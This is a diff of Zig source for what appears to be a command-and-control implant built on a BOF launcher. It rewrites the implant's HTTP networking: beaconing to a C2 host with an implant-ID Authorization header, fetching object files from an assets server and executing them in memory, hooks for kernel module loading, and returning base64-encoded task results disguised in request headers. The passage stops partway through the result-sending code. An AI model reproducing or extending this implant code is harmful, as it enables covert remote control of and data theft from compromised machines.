@@ -1,19 +1,21 @@
 const std = @import("std");
 const assert = std.debug.assert;
 const bof = @import("bof_launcher_api");
+const beacon = @import("bof_api").beacon;
 
 pub const std_options = std.Options{
     .http_disable_tls = true,
     .log_level = .info,
 };
-const debug_proxy_enabled = false;
+const debug_proxy_enabled = true;
 const debug_proxy_host = "127.0.0.1";
 const debug_proxy_port = 8080;
 
 // BOF-specific error codes
-const netFullHttpErrors = enum(u8) {
+const BofErrors = enum(u8) {
     OutOfMemory,
-    Unknown,
+    netInitError,
+    UnknownError,
 };
 
 const PendingBof = struct {
@@ -23,13 +25,362 @@ const PendingBof = struct {
     launcher_error_code: i32 = 0,
 };
 
-const BofRes = struct {
+const BofRes = extern struct {
     status_code: i32 = 0,
-    output: ?[]const u8 = null,
+    output: ?[*]const u8 = null,
+    len: u32 = 0,
+    taskID: [*:0]const u8 = undefined,
 };
 
+//
+// ----------------------------------------------------------------------------
+//
+// BOF-specific error codes
+const netConnectionType = enum(u8) {
+    Heartbeat,
+    ResourceFetch,
+    TaskResult,
+};
+
+
+fn netInit(allocator: *anyopaque) callconv(.C) *anyopaque {
+    const alloc: *std.mem.Allocator = @ptrCast(@alignCast(allocator));
+
+    return netHttpInit(alloc.*) catch unreachable;
+}
+
+fn netHttpInit(allocator: std.mem.Allocator) !*std.http.Client {
+    // create proxy if set so
+    const http_proxy = if (debug_proxy_enabled) blk: {
+        const proxy = try allocator.create(std.http.Client.Proxy);
+        proxy.* = .{
+            .protocol = .plain,
+            .authorization = null,
+            .host = debug_proxy_host,
+            .port = debug_proxy_port,
+            .supports_connect = true,
+        };
+        break :blk proxy;
+    } else null;
+
+    // create and return http_client
+    const http_client = try allocator.create(std.http.Client);
+    http_client.* = .{
+        .allocator = allocator,
+        .http_proxy = http_proxy,
+    };
+
+    return @ptrCast(http_client);
+}
+
+fn netConnect(state: *anyopaque, connectionType: netConnectionType, extra_data: ?*anyopaque) callconv(.C) ?*anyopaque {
+    const s: *State = @ptrCast(@alignCast(state));
+
+    const res = netHttpConnect(s, connectionType, extra_data) catch |err| switch (err) {
+        error.OutOfMemory => return null,
+        else => return null,
+    };
+
+    return @ptrCast(res);
+}
+
+fn netHttpConnect(s: *State, connectionType: netConnectionType, extra_data: ?*anyopaque) !*std.http.Client.Connection {
+    const http_client: *std.http.Client = @ptrCast(@alignCast(s.net_client));
+
+    var address: []const u8 = undefined;
+    var host: []const u8 = undefined;
+    var port: u16 = undefined;
+    const proto: std.http.Client.Connection.Protocol = .plain;
+
+    _ = extra_data;
+
+    if(connectionType == netConnectionType.Heartbeat) {
+        address = s.c2_host;
+    }
+    else if(connectionType == netConnectionType.ResourceFetch) {
+        address = s.assets_host;
+    }
+    else if(connectionType == netConnectionType.TaskResult) {
+        address = s.c2_host;
+    }
+
+    var iter = std.mem.splitScalar(u8, address, ':');
+    const h = iter.next() orelse return error.BadData;
+    host = try s.allocator.dupe(u8, h);
+    port = try std.fmt.parseInt(u16, iter.next() orelse return error.BadData, 10);
+
+    const conn = try http_client.connect(host, port, proto);
+    conn.closing = true;
+    if(http_client.http_proxy != null)
+        conn.proxied = true;
+
+    return conn;
+}
+
+fn netDisconnect(state: *anyopaque, net_connection: *anyopaque) callconv(.C) void {
+    //const s: *State = @ptrCast(@alignCast(state));
+    //const conn: *std.http.Client.Connection = @ptrCast(@alignCast(net_connection));
+    //
+    _ = net_connection;
+    _ = state;
+    
+    std.log.info("in netDisconnect", .{});
+
+    //conn.close(s.allocator);
+}
+
+fn netExchange(state: *anyopaque, connectionType: netConnectionType, net_connection: *anyopaque, len: *u32, extra_data: ?*anyopaque) callconv(.C) ?*anyopaque {
+    const s: *State = @ptrCast(@alignCast(state));
+    const conn: *std.http.Client.Connection = @ptrCast(@alignCast(net_connection));
+
+    const res = netHttpExchange(s, connectionType, conn, len, extra_data) catch |err| switch (err) {
+        error.OutOfMemory => return null,
+        else => return null,
+    };
+
+    if(res != null) {
+        return @ptrCast(res.?.ptr);
+    }
+    else
+        return null;
+}
+
+fn netHttpExchange(s: *State, connectionType: netConnectionType, conn: *std.http.Client.Connection, len: *u32, extra_data: ?*anyopaque) !?[]u8 {
+    const http_client: *std.http.Client = @ptrCast(@alignCast(s.net_client));
+
+    var http_method: std.http.Method = undefined;
+    var uri: std.Uri = undefined;
+    var body_data: ?[]u8 = null;
+    var bof_res: ?*BofRes = null;
+
+    //prepare request options
+    const server_header_buffer = s.allocator.alloc(u8, 16 * 1024) catch return null;
+    defer s.allocator.free(server_header_buffer);
+
+    const http_reqOptions = s.allocator.create(std.http.Client.RequestOptions) catch return null;
+    http_reqOptions.* = .{
+        .server_header_buffer = server_header_buffer,
+        .keep_alive = true,
+    };
+    defer s.allocator.destroy(http_reqOptions);
+
+    if(connectionType == netConnectionType.Heartbeat) {
+
+        http_method = std.http.Method.GET;
+        const url = std.fmt.allocPrintZ(s.allocator, "http://{s}{s}", .{ s.c2_host, s.c2_endpoint }) catch return null;
+        //defer s.allocator.free(url);
+        uri = std.Uri.parse(std.mem.sliceTo(url, 0)) catch return null;
+
+        // apply HTTP header transforms
+        _ = s.implant_actions.netMasquerade(s, connectionType, http_reqOptions, null, len);
+    }
+    else if(connectionType == netConnectionType.ResourceFetch and extra_data != null) {
+        // in case of ResourceFetch exchange extra_data is a  0-terminated path to the resource
+        const bof_path: []const u8 = std.mem.sliceTo(@as([*:0]const u8, @ptrCast(extra_data)), 0);
+
+        std.log.info("in netExchange: ResurceFetch {s}", .{bof_path});
+
+        http_method = std.http.Method.GET;
+        const url = std.fmt.allocPrintZ(s.allocator, "http://{s}{s}", .{ s.assets_host, bof_path }) catch unreachable;
+        //defer s.allocator.free(url);
+        uri = std.Uri.parse(std.mem.sliceTo(url, 0)) catch return null;
+
+        // apply HTTP header transforms
+        _ = s.implant_actions.netMasquerade(s, connectionType, http_reqOptions, null, len);
+    }
+    else if(connectionType == netConnectionType.TaskResult and extra_data != null) {
+        // in case of TaskResult exchange extra_data is a length len.* 
+
+        bof_res = @as(*BofRes, @ptrCast(@alignCast(extra_data)));
+
+        http_method = std.http.Method.POST;
+        const url = std.fmt.allocPrintZ(s.allocator, "http://{s}{s}", .{ s.c2_host, s.c2_endpoint }) catch return null;
+        //defer s.allocator.free(url);
+        uri = std.Uri.parse(std.mem.sliceTo(url, 0)) catch return null;
+
+        // apply HTTP header transforms and
+        // mask body data according to transforms implemented in netMasquerade(...) and assign it to 'body_data' which will be sent
+        var masked_body_len: u32 = 0;
+        const masked_body: ?[*]u8 = @ptrCast(s.implant_actions.netMasquerade(s, connectionType, http_reqOptions, bof_res, &masked_body_len));
+        if(masked_body) |body| {
+            body_data = @as([*]u8, @ptrCast(@constCast(body)))[0..masked_body_len];        
+        }
+    }
+
+    // create HTTP request
+    var server_header: std.heap.FixedBufferAllocator = .init(server_header_buffer);
+    const http_request = s.allocator.create(std.http.Client.Request) catch return null;
+    http_request.* = .{
+        .uri = uri,
+        .client = http_client,
+        .connection = conn,
+        .keep_alive = http_reqOptions.keep_alive,
+        .method = http_method,
+        .version = http_reqOptions.version,
+        .transfer_encoding = .none,
+        .redirect_behavior = http_reqOptions.redirect_behavior,
+        .handle_continue = http_reqOptions.handle_continue,
+        .response = .{
+            .version = undefined,
+            .status = undefined,
+            .reason = undefined,
+            .keep_alive = undefined,
+            .parser = .init(server_header.buffer[server_header.end_index..]),
+        },
+        .headers = http_reqOptions.headers,
+        .extra_headers = http_reqOptions.extra_headers,
+        .privileged_headers = http_reqOptions.privileged_headers,
+    };
+    defer s.allocator.destroy(http_request);
+
+    // sends HTTP header
+    http_request.send() catch unreachable;
+
+    // sends HTTP body
+    if(connectionType == netConnectionType.TaskResult and body_data != null) {
+        http_request.transfer_encoding = .{ .content_length = body_data.?.len };
+        http_request.writeAll(body_data.?) catch unreachable;
+        http_request.finish() catch unreachable;
+    }
+
+    // get the for response
+    // TODO make sure that HTTP 200 was returned
+    http_request.wait() catch return null;
+
+    const body_resp_content = s.allocator.alloc(u8, @intCast(http_request.response.content_length.?)) catch return null;
+    errdefer s.allocator.free(body_resp_content);
+
+    _ = http_request.readAll(body_resp_content) catch return null;
+    len.* = @intCast(body_resp_content.len);
+
+    // TODO: free in case of error
+    http_request.deinit();
+
+    if(connectionType != netConnectionType.TaskResult) {
+        return body_resp_content;
+    }
+    else return null;
+}
+
+fn netMasquerade(state: *anyopaque, connectionType: netConnectionType, hdr_to_mask: *anyopaque, data_to_mask: ?*anyopaque, len: *u32) callconv(.C) ?*anyopaque {
+    const s: *State = @ptrCast(@alignCast(state));
+    const http_reqOptions: *std.http.Client.RequestOptions = @ptrCast(@alignCast(hdr_to_mask));
+    //const bof_res: *BofRes = @ptrCast(@alignCast(data_to_mask));
+
+    const res = netHttpMasquerade(s, connectionType, http_reqOptions, data_to_mask, len) catch |err| switch (err) {
+        error.OutOfMemory => return null,
+        else => return null,
+    };
+
+    if(res != null) {
+        return @ptrCast(res.?.ptr);
+    }
+    else
+        return null;
+}
+
+fn netHttpMasquerade(s: *State, connectionType: netConnectionType, http_reqOptions: *std.http.Client.RequestOptions, data_to_mask: ?*anyopaque, len: *u32) !?[]u8 {
+
+    //
+    // Implement transforms based on type of the current connection
+    //
+    if(connectionType == netConnectionType.Heartbeat) {
+
+        // header transforms: implantID -> HTTP authorization header
+        http_reqOptions.headers.authorization = std.http.Client.Request.Headers.Value {
+            .override = s.implant_identity,
+        };
+    } else if(connectionType == netConnectionType.ResourceFetch) {
+
+       // header transforms: implantID -> HTTP authorization header
+       http_reqOptions.headers.authorization = std.http.Client.Request.Headers.Value {
+            .override = s.implant_identity,
+        }; 
+    } else if(connectionType == netConnectionType.TaskResult) {
+
+        // sth is wrong: nothing to mask
+        const bof_res: ?*BofRes = @ptrCast(@alignCast(data_to_mask));
+        if(bof_res == null) return null;
+
+        // header transforms: taskID -> HTTP authorization header
+        const taskID = std.mem.sliceTo(bof_res.?.taskID, 0);
+        http_reqOptions.headers.authorization = std.http.Client.Request.Headers.Value {
+            .override = taskID,
+        };
+
+        // header transforms: string(result:{d}) -> HTTP user_agent header
+        http_reqOptions.headers.user_agent = std.http.Client.Request.Headers.Value {
+            .override = try std.fmt.allocPrintZ(s.allocator, "result:{d}", .{bof_res.?.status_code})
+        };
+
+        // data / body transforms: base64(body)
+        if(bof_res.?.output != null) {
+
+            const new_body_len = s.base64_encoder.calcSize(bof_res.?.len);
+            const out_b64 = try s.allocator.alloc(u8, new_body_len);
+            errdefer s.allocator.free(out_b64);
+
+            const body = @as([*]u8, @ptrCast(@constCast(bof_res.?.output)))[0..bof_res.?.len];        
+            _ = s.base64_encoder.encode(out_b64, body);
+
+            // update len and return pointer to new buffer
+            len.* = @intCast(new_body_len); 
+            return out_b64;
+        }
+    }
+
+    return null;
+}
+
+fn netUnmasquerade(state: *anyopaque, pkt_hdr: *anyopaque, pkt_data: ?*anyopaque, len: *u32) callconv(.C) ?*anyopaque {
+    const s: *State = @ptrCast(@alignCast(state));
+    const req: *std.http.Client.Request = @ptrCast(@alignCast(pkt_hdr));
+
+    _ = s;
+
+    std.log.info("req response status: {s}", .{req.response.status.phrase() orelse ""});
+    if (req.response.status != .ok) {
+        std.log.err("netConnect: Expected response status '200 OK' got '{} {s}'", .{
+            @intFromEnum(req.response.status),
+            req.response.status.phrase() orelse "",
+        });
+        return null;
+    }
+
+    var iter = req.response.iterateHeaders();
+    var content_type: std.http.Header = undefined;
+    while (iter.next()) |hdr| {
+        if (std.mem.eql(u8, hdr.name, "Content-Type")) {
+            content_type = hdr;
+            break;
+        }
+    }
+
+    std.log.info("Content type: {s}", .{content_type.value});
+
+    if (!std.ascii.eqlIgnoreCase(content_type.value, "text/html; charset=utf-8")) {
+        return null;
+    }
+
+    std.log.info("end of unmasqerade", .{});
+
+    // copy and process data/len accordingly and return pointer to data ready for command processing
+    // update len with a new length of the data:
+    // const old_len = len.*;
+    // len.* = new_len;
+    _ = len;
+    return pkt_data;
+}
+
+//
+// ----------------------------------------------------------------------------
+//
+
 const State = struct {
+    const Self = @This();
+
     allocator: std.mem.Allocator,
+    net_client: *anyopaque = undefined,
 
     implant_identity: []u8,
     implant_actions: ImplantActions,
@@ -39,8 +390,6 @@ const State = struct {
     c2_host: [:0]const u8,
     c2_endpoint: [:0]const u8,
     assets_host: [:0]const u8,
-
-    net_client: *anyopaque = undefined,
 
     pending_bofs: std.ArrayList(PendingBof),
     persistent_bofs: std.AutoHashMap(u64, bof.Object),
@@ -69,32 +418,23 @@ const State = struct {
         const implant_identity = try getImplantIdentity(allocator);
 
         const implant_actions: ImplantActions = .{
-            .netConnect = netConnectC,
-            .netDisconnect = netDisconnectC,
-            .netSend = netSend,
-            .netRecv = netRecv,
+            .netInit = netInit,
+            .netConnect = netConnect,
+            .netDisconnect = netDisconnect,
+            .netExchange = netExchange,
             .netUnmasquerade = netUnmasquerade,
             .netMasquerade = netMasquerade,
         };
+
+        const net_client = implant_actions.netInit(@constCast(@ptrCast(&allocator)));
 
         //TODO: move it to ImplanActions.netMasquarede(...) function
         const implant_identity_b64 = try allocator.alloc(u8, base64_encoder.calcSize(implant_identity.len));
         _ = std.base64.Base64Encoder.encode(&base64_encoder, implant_identity_b64, implant_identity);
 
-        //const http_proxy = if (debug_proxy_enabled) blk: {
-        //    const proxy = try allocator.create(std.http.Client.Proxy);
-        //    proxy.* = .{
-        //        .protocol = .plain,
-        //        .authorization = null,
-        //        .host = debug_proxy_host,
-        //        .port = debug_proxy_port,
-        //        .supports_connect = true,
-        //    };
-        //    break :blk proxy;
-        //} else null;
-
         return State{
             .allocator = allocator,
+            .net_client = net_client,
 
             .implant_identity = implant_identity_b64,
             .implant_actions = implant_actions,
@@ -129,14 +469,15 @@ const State = struct {
 const ImplantActions = struct {
     const Self = @This();
 
-    netConnect: *const fn (state: *anyopaque, address: [*:0]const u8) callconv(.C) ?*anyopaque = undefined,
+    netInit: *const fn (state: *anyopaque) callconv(.C) *anyopaque = undefined,
+
+    netConnect: *const fn (state: *anyopaque, connectionType: netConnectionType, data: ?*anyopaque) callconv(.C) ?*anyopaque = undefined,
     netDisconnect: *const fn (state: *anyopaque, conn: *anyopaque) callconv(.C) void = undefined,
 
-    netSend: *const fn (state: *anyopaque, pkt_header: *anyopaque, pkt_data: ?*anyopaque, len: u32) callconv(.C) c_int = undefined,
-    netRecv: *const fn (state: *anyopaque, buf: *anyopaque, body_len: *u32) callconv(.C) ?*anyopaque = undefined,
+    netExchange: *const fn (state: *anyopaque, connectionType: netConnectionType, net_connection: *anyopaque, len: *u32, extra_data: ?*anyopaque) callconv(.C) ?*anyopaque = undefined,
 
     netUnmasquerade: *const fn (state: *anyopaque, hdr: *anyopaque, data: ?*anyopaque, len: *u32) callconv(.C) ?*anyopaque = undefined,
-    netMasquerade: *const fn (state: *anyopaque, hdr_to_mask: *anyopaque, data_to_mask: *anyopaque) callconv(.C) *anyopaque = undefined,
+    netMasquerade: *const fn (state: *anyopaque, connectionType: netConnectionType, hdr_to_mask: *anyopaque, data_to_mask: ?*anyopaque, len: *u32) callconv(.C) ?*anyopaque = undefined,
 
     kmodLoad: ?*const fn (module_image: [*]const u8, len: usize, param_values: [*:0]const u8) callconv(.C) c_int = null,
     kmodRemove: ?*const fn (mod_name: [*:0]const u8, flags: u32) callconv(.C) c_int = null,
@@ -163,12 +504,14 @@ fn receiveAndLaunchBof(allocator: std.mem.Allocator, state: *State, task_fields:
     const bof_header = task_fields[3];
     const bof_argv_b64 = task_fields[4];
 
+    std.log.info("bof_argv_b64: {s}", .{bof_argv_b64});
+
     const len = try state.base64_decoder.calcSizeForSlice(bof_argv_b64);
     const bof_argv = try allocator.alloc(u8, len);
     defer allocator.free(bof_argv);
     _ = try state.base64_decoder.decode(bof_argv, bof_argv_b64);
 
-    // process header { exec_mode:args_spec:hash:[persist] }
+    // process BOF header { exec_mode:args_spec{iszZb}:bofHash:[persist] }
     var bof_header_iter = std.mem.splitScalar(u8, bof_header, ':');
 
     // get hint regarding execution mode
@@ -193,22 +536,16 @@ fn receiveAndLaunchBof(allocator: std.mem.Allocator, state: *State, task_fields:
         bof_to_exec = b;
         is_loaded = true;
 
-        // we need to fetch BOF file content from C2 sever
+        // else: we need to fetch BOF file content from C2 sever
     } else {
-        //const bof_content = try fetchBlob(allocator, state, bof_path);
-        //defer allocator.free(bof_content);
-
-        const uri = try std.fmt.allocPrintZ(allocator, "GET http://{s}{s}", .{ state.c2_host, bof_path });
-        defer allocator.free(uri);
 
         std.log.info("fetching BOF", .{});
-        const req = state.implant_actions.netConnect(state, uri);
+        const net_conn = state.implant_actions.netConnect(state, netConnectionType.ResourceFetch, null);
 
-        if (req) |req_raw| {
-            _ = state.implant_actions.netSend(state, req_raw, null, 0);
+        if (net_conn) |conn| {
             var body_len: u32 = 0;
-            const bof_content: ?[*]u8 = @ptrCast(state.implant_actions.netRecv(state, req_raw, &body_len));
-            std.log.info("after BOF fetch", .{});
+            const bof_content: ?[*]u8 = @ptrCast(state.implant_actions.netExchange(state, netConnectionType.ResourceFetch, conn, &body_len, @constCast(@ptrCast(bof_path.ptr))));
+            std.log.info("after BOF fetch (BOF size: {d}", .{body_len});
 
             if (bof_content) |b| {
                 bof_to_exec = try bof.Object.initFromMemory(b[0..body_len]);
@@ -219,53 +556,56 @@ fn receiveAndLaunchBof(allocator: std.mem.Allocator, state: *State, task_fields:
                     std.log.info("Loaded new persistent BOF (hash: 0x{x})", .{hash});
                 }
             }
-            state.implant_actions.netDisconnect(state, req_raw);
+            state.implant_actions.netDisconnect(state, conn);
         }
     }
 
     var bof_context: ?*bof.Context = null;
     errdefer if (bof_context) |context| context.release();
 
-    std.log.info("bof_argv: {any}", .{bof_argv});
-
     const bof_args = try bof.Args.init();
     defer bof_args.release();
 
-    var iter = std.mem.tokenizeScalar(u8, bof_argv, ' ');
-    var i: u32 = 0;
+    if(!std.mem.eql(u8, bof_argv, "")) {
 
-    // build 'bof_args' by parsing 'argv' and inspecting args_spec:
-    // possible values for args_spec: iszZb
-    bof_args.begin();
-    while (iter.next()) |arg| {
-        std.log.info("Adding arg: {s}", .{arg});
+        std.log.info("bof_argv: {s}", .{bof_argv});
 
-        //if (args_spec[i] == 'b') {
-        //    const buf = if (root.object.get(arg)) |value| buf: {
-        //        const len = try state.base64_decoder.calcSizeForSlice(value.string);
-        //        const buf = try allocator.alloc(u8, len);
-        //        errdefer allocator.free(buf);
-        //        _ = try state.base64_decoder.decode(buf, value.string);
-        //        break :buf buf;
-        //    } else null;
-        //    defer if (buf) |b| allocator.free(b);
+        var iter = std.mem.tokenizeScalar(u8, bof_argv, ' ');
+        var i: u32 = 0;
 
-        //    std.log.info("buf: {s} {s}", .{ arg, buf.? });
+        // build 'bof_args' by parsing 'argv' and inspecting args_spec:
+        // possible values for args_spec: iszZb
+        bof_args.begin();
+        while (iter.next()) |arg| {
+            std.log.info("Adding arg: {s}", .{arg});
 
-        //    const trimmed_buf = std.mem.trimRight(u8, buf.?, "\n");
+            //if (args_spec[i] == 'b') {
+            //    const buf = if (root.object.get(arg)) |value| buf: {
+            //        const len = try state.base64_decoder.calcSizeForSlice(value.string);
+            //        const buf = try allocator.alloc(u8, len);
+            //        errdefer allocator.free(buf);
+            //        _ = try state.base64_decoder.decode(buf, value.string);
+            //        break :buf buf;
+            //    } else null;
+            //    defer if (buf) |b| allocator.free(b);
 
-        //    const buf_len = try std.fmt.allocPrint(allocator, "i:{d}", .{trimmed_buf.len});
-        //    defer allocator.free(buf_len);
+            //    std.log.info("buf: {s} {s}", .{ arg, buf.? });
 
-        //    try bof_args.add(buf_len);
-        //    try bof_args.add(std.mem.asBytes(&trimmed_buf.ptr));
-        //} else {
-        try bof_args.add(arg);
-        //}
+            //    const trimmed_buf = std.mem.trimRight(u8, buf.?, "\n");
 
-        i += 1;
+            //    const buf_len = try std.fmt.allocPrint(allocator, "i:{d}", .{trimmed_buf.len});
+            //    defer allocator.free(buf_len);
+
+            //    try bof_args.add(buf_len);
+            //    try bof_args.add(std.mem.asBytes(&trimmed_buf.ptr));
+            //} else {
+            try bof_args.add(arg);
+            //}
+
+            i += 1;
+        }
+        bof_args.end();
     }
-    bof_args.end();
 
     if (std.mem.eql(u8, exec_mode, "inline")) {
         std.log.info("Execution mode: {s}-based", .{exec_mode});
@@ -319,167 +659,49 @@ fn receiveAndLaunchBof(allocator: std.mem.Allocator, state: *State, task_fields:
     } else return error.FailedToRunBof;
 }
 
-fn netDisconnectC(state: *anyopaque, conn: *anyopaque) callconv(.C) void {
-    //const s: *State = @ptrCast(@alignCast(state));
-    const req: *std.http.Client.Request = @ptrCast(@alignCast(conn));
-    //const http_client: *std.http.Client = @ptrCast(@alignCast(s.net_client));
-
-    _ = state;
-
-    req.deinit();
-    //http_client.deinit();
-}
-
-fn netConnect(s: *State, address: []const u8) !*std.http.Client.Request {
-    var http_client: std.http.Client = .{
-        .allocator = s.allocator,
-    };
-    const ptr_http_client = try s.allocator.create(std.http.Client);
-    ptr_http_client.* = http_client;
-
-    s.net_client = @constCast(@ptrCast(ptr_http_client));
-
-    var iter_addr = std.mem.splitScalar(u8, address, ' ');
-    const http_method = iter_addr.next() orelse unreachable;
-
-    const url = iter_addr.next() orelse unreachable;
-
-    const uri = try std.Uri.parse(std.mem.sliceTo(url, 0));
-
-    // TODO: zwolnic pamiec
-    //var server_header_buffer: [1024]u8 = undefined;
-    const server_header_buffer = try s.allocator.alloc(u8, 16 * 1024);
-
-    const req = try http_client.open(@enumFromInt(std.http.Method.parse(http_method)), uri, .{
-        .server_header_buffer = server_header_buffer,
-        .extra_headers = &.{.{ .name = "Authorization", .value = s.implant_identity }},
-    });
-
-    const ptr_req = try s.allocator.create(std.http.Client.Request);
-    ptr_req.* = req;
-
-    return ptr_req;
-}
-
-fn netConnectC(state: *anyopaque, address: [*:0]const u8) callconv(.C) ?*anyopaque {
-    const s: *State = @ptrCast(@alignCast(state));
-    const addr = std.mem.sliceTo(address, 0);
-
-    const res = netConnect(s, addr) catch |err| switch (err) {
-        error.OutOfMemory => return null,
-        else => return null,
-    };
-
-    return @ptrCast(res);
-}
-
-fn netSend(state: *anyopaque, pkt_header: *anyopaque, pkt_data: ?*anyopaque, len: u32) callconv(.C) c_int {
-    const s: *State = @ptrCast(@alignCast(state));
-    const r: *std.http.Client.Request = @ptrCast(@alignCast(pkt_header));
-
-    _ = s;
-
-    // sends HTTP header
-    r.send() catch unreachable;
-
-    // sends HTTP body
-    if (pkt_data != null and len > 0) {
-        const d: [*]const u8 = @ptrCast(@alignCast(pkt_data));
-        r.transfer_encoding = .{ .content_length = len };
-        r.writeAll(d[0..len]) catch unreachable;
-        r.finish() catch unreachable;
-    }
-
-    return 0;
-}
-
-fn netRecv(state: *anyopaque, buf: *anyopaque, body_len: *u32) callconv(.C) ?*anyopaque {
-    const s: *State = @ptrCast(@alignCast(state));
-    const r: *std.http.Client.Request = @ptrCast(@alignCast(buf));
-
-    r.wait() catch unreachable;
-    const body_content = s.allocator.alloc(u8, @intCast(r.response.content_length.?)) catch unreachable;
-
-    _ = r.readAll(body_content) catch unreachable;
-
-    body_len.* = @intCast(body_content.len);
-    return body_content.ptr;
-}
-
-fn netMasquerade(state: *anyopaque, hdr_to_mask: *anyopaque, data_to_mask: *anyopaque) callconv(.C) *anyopaque {
-    const s: *State = @ptrCast(@alignCast(state));
-    const req: *std.http.Client.Request = @ptrCast(@alignCast(hdr_to_mask));
-    const bof_res: *BofRes = @ptrCast(@alignCast(data_to_mask));
-
-    req.headers.user_agent = std.http.Client.Request.Headers.Value{ .override = std.fmt.allocPrintZ(s.allocator, "result:{d}", .{bof_res.status_code}) catch unreachable };
-    std.log.info("\nw netMasquerade (status_code): {d}", .{bof_res.status_code});
-
-    if (bof_res.output) |output| {
-        const out_b64 = s.allocator.alloc(u8, s.base64_encoder.calcSize(output.len)) catch unreachable;
-        std.log.info("\nw netMasquerade (output): {s}", .{output});
-
-        _ = s.base64_encoder.encode(out_b64, output);
-
-        bof_res.output = out_b64;
-    }
-
-    return bof_res;
-}
-
-fn netUnmasquerade(state: *anyopaque, pkt_hdr: *anyopaque, pkt_data: ?*anyopaque, len: *u32) callconv(.C) ?*anyopaque {
-    const s: *State = @ptrCast(@alignCast(state));
-    const req: *std.http.Client.Request = @ptrCast(@alignCast(pkt_hdr));
-
-    _ = s;
-
-    std.log.info("req response status: {s}", .{req.response.status.phrase() orelse ""});
-    if (req.response.status != .ok) {
-        std.log.err("netConnect: Expected response status '200 OK' got '{} {s}'", .{
-            @intFromEnum(req.response.status),
-            req.response.status.phrase() orelse "",
-        });
-        return null;
-    }
-
-    var iter = req.response.iterateHeaders();
-    var content_type: std.http.Header = undefined;
-    while (iter.next()) |hdr| {
-        if (std.mem.eql(u8, hdr.name, "Content-Type")) {
-            content_type = hdr;
-            break;
-        }
-    }
-
-    std.log.info("Content type: {s}", .{content_type.value});
-
-    if (!std.ascii.eqlIgnoreCase(content_type.value, "text/html; charset=utf-8")) {
-        return null;
-    }
-
-    // copy and process data/len accordingly and return pointer to data ready for command processing
-    // update len with a new length of the data:
-    // const old_len = len.*;
-    // len.* = new_len;
-    _ = len;
-    return pkt_data;
-}
-
 fn processCommands(allocator: std.mem.Allocator, state: *State, resp_content: []u8) !void {
     var task_fields = std.ArrayList([]const u8).init(allocator);
     defer task_fields.deinit();
 
-    var task_id: []const u8 = undefined;
-    var task_name: []const u8 = undefined;
-    var i: u32 = 0;
-
+    // handle task from C2, valid task's format:
+    // taskID,cmdName{type:name},[URI],[bofHeader{execMode,argTypes,bofHash,[persist]}],[base64(argv)]
     var iter_task = std.mem.splitScalar(u8, resp_content, ',');
-    while (iter_task.next()) |field| {
-        if (i == 0) task_id = field;
-        if (i == 1) task_name = field;
-        std.log.info("Field: {s}", .{field});
-        try task_fields.append(field);
-        i = i + 1;
+
+    const task_id = iter_task.next() orelse return error.BadData;
+    try task_fields.append(task_id);
+
+    const task_name = iter_task.next() orelse return error.BadData;
+    try task_fields.append(task_name);
+
+    // for uri: make sure that it is \0 ended
+    const uri = iter_task.next();
+    var uri_final: []const u8 = undefined;
+    if(uri) |u| {
+        uri_final = try std.mem.joinZ(allocator, "", &.{u});
+    } else {
+        uri_final = try std.mem.joinZ(allocator, "", &.{""});
     }
+    try task_fields.append(uri_final);
+    defer allocator.free(uri_final);
+
+    const bofHeader = iter_task.next();
+    if(bofHeader) |h| try task_fields.append(h) else try task_fields.append("");
+
+    const argv = iter_task.next();
+    if(argv) |a| try task_fields.append(a) else try task_fields.append("");
+
+    if(task_fields.items.len != 5)
+        return error.BadData;
+
+    iter_task.reset();
+    std.log.info("Following task received:]\n", .{});
+    std.log.info("-------------------------------------------------------------\n", .{});
+    std.log.info("taskID: {s}", .{iter_task.next() orelse return error.BadData });
+    std.log.info("Command name: {s}", .{iter_task.next() orelse return error.BadData });
+    std.log.info("URI: {s}", .{iter_task.next() orelse return error.BadData });
+    std.log.info("bofHeader: {s}", .{iter_task.next() orelse return error.BadData });
+    std.log.info("argv: {s}", .{iter_task.next() orelse return error.BadData });
+    std.log.info("-------------------------------------------------------------\n", .{});
 
     // check type of task to execute:
     // bof - fetch and execute bof
@@ -490,9 +712,16 @@ fn processCommands(allocator: std.mem.Allocator, state: *State, resp_content: []
     const cmd_prefix = iter_command.next() orelse return error.BadData;
     const cmd_name = iter_command.next() orelse return error.BadData;
 
+
     // tasked for BOF execution?
     if (std.mem.eql(u8, cmd_prefix, "bof")) {
         std.log.info("Executing bof: {s}", .{cmd_name});
+
+        if(uri == null or bofHeader == null)
+            return error.BadData;
+
+        if(std.mem.eql(u8, uri.?, "") or std.mem.eql(u8, bofHeader.?, ""))
+            return error.BadData;
 
         receiveAndLaunchBof(allocator, state, task_fields.items.ptr[0..task_fields.items.len]) catch |err| {
             try state.pending_bofs.append(.{
@@ -501,7 +730,7 @@ fn processCommands(allocator: std.mem.Allocator, state: *State, resp_content: []
                 .launcher_error_code = @abs(@intFromError(err)) - 1000,
             });
         };
-        // tasked for kernel module loading?
+    // tasked for kernel module loading?
     } else if (std.mem.eql(u8, cmd_prefix, "kmod")) {
         if (state.implant_actions.kmodLoad == null) {
             std.log.info("Kernel module loading not implemented", .{});
@@ -545,18 +774,26 @@ fn processPendingBofs(allocator: std.mem.Allocator, state: *State) !void {
     while (pending_bof_index != state.pending_bofs.items.len) {
         const pending_bof = state.pending_bofs.items[pending_bof_index];
 
-        var bof_res = BofRes{
-            .status_code = undefined,
-            .output = null,
-        };
 
+        //
         // BOF is still running
+        //
+
         if (pending_bof.context != null and pending_bof.context.?.isRunning()) {
             pending_bof_index += 1;
             continue;
         }
 
+        //
         // BOF run is completed so check its status code and output
+        //
+
+        var bof_res = BofRes{
+            .status_code = undefined,
+            .output = null,
+            .len = 0,
+            .taskID = undefined,
+        };
 
         // checking status code
         bof_res.status_code = if (pending_bof.context) |context|
@@ -564,10 +801,18 @@ fn processPendingBofs(allocator: std.mem.Allocator, state: *State) !void {
         else
             pending_bof.launcher_error_code;
 
+        // getting task id
+        const tempSlice = try allocator.dupeZ(u8, pending_bof.task_id);
+        bof_res.taskID = tempSlice.ptr;
+
         // checking output
         if (pending_bof.context) |context| {
-            if (context.getOutput()) |output|
-                bof_res.output = allocator.dupe(u8, output) catch unreachable;
+            if (context.getOutput()) |boftput| {
+                const temp = try allocator.dupe(u8, boftput);
+
+                bof_res.output = temp.ptr;
+                bof_res.len = @intCast(boftput.len);
+            }
 
             if (!pending_bof.is_persistent)
                 context.getObject().release();
@@ -575,31 +820,23 @@ fn processPendingBofs(allocator: std.mem.Allocator, state: *State) !void {
             context.release();
         }
 
-        // SENDING RESUTLS TO C2 SERVER:
